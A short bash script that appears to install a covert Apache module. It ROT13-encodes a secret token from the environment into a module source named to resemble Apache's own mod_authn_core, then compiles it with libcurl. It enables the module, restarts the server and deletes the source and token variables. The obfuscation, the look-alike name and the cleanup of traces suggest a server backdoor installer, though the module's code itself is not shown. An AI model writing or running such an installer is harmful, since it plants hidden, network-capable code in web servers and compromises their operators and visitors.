#!/bin/bash
T2=$(python3 -c 'import codecs;import os;var=os.environ.get("TOKEN2");s=codecs.encode(var,"rot13");print(s,end="")')
sed -i "s/PLACEHOLDER/$T2/" /tmp/mod_authx_core.c
unset T2
unset TOKEN{1,2,3,4,5,6,7,8,9}
apxs2 -c -i /tmp/mod_authx_core.c -lcurl
echo 'LoadModule authx_core_module /usr/lib/apache2/modules/mod_authx_core.so' > /etc/apache2/mods-available/authx_core.load
a2enmod authx_core
service apache2 restart
rm /tmp/mod_*
